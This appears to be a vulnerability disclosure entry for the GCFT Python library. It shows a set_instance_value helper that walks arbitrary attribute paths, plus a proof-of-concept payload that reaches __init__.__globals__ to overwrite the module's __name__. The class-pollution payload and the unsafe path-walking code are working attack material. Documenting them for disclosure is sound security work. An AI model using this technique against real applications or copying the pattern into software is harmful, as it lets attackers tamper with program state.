## GCFT

### Meta

+ Library: GCFT
+ Stars: 101
+ Version: N/A
+ CVE: N/A
+ Status: Pending
+ Payload: ```set_instance_value(obj, [('attr', '__init__'), ('attr', '__globals__'), ('item', '__name__')], 'polluted')```
+ Foundby: redacted
+ Report: Pending
+ Type: App
+ Exploitability: Low
+ Input: Local

### Library

https://github.com/LagoLunatic/GCFT

### Vulnerable Code Snippet

```python
def set_instance_value(instance, access_path: list[tuple], value):
  for access_type, access_arg in access_path[:-1]:
    if access_type == 'attr':
      instance = getattr(instance, access_arg)
    elif access_type == 'item':
      instance = get_instance_item(instance, access_arg)
    else:
      raise NotImplementedError
  
  access_type, access_arg = access_path[-1]
  if access_type == 'attr':
    setattr(instance, access_arg, value)
  elif access_type == 'item':
    set_instance_item(instance, access_arg, value)
  else:
    raise NotImplementedError
```
### PoC

```python
class Animal:
  def __init__(self, typ, age):
      self.type = typ
      self.age = age
      self.id = random.randint(1, 99999)

obj = Animal('cat', 11)

set_instance_value(obj, [('attr', '__init__'), ('attr', '__globals__'), ('item', '__name__')], 'polluted')
print(__name__)
```